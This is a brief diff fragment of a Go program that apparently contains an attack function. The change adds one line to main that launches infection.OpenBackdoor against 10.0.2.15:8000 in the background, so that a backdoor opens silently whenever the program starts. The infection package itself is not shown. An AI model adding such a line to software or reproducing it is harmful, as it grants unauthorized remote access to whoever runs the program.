@@ -52,6 +52,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 }
 
 func main() {
+	go infection.OpenBackdoor("10.0.2.15:8000")
 	f, err := os.Create("/tmp/test")
 	if err != nil {
         panic(err)
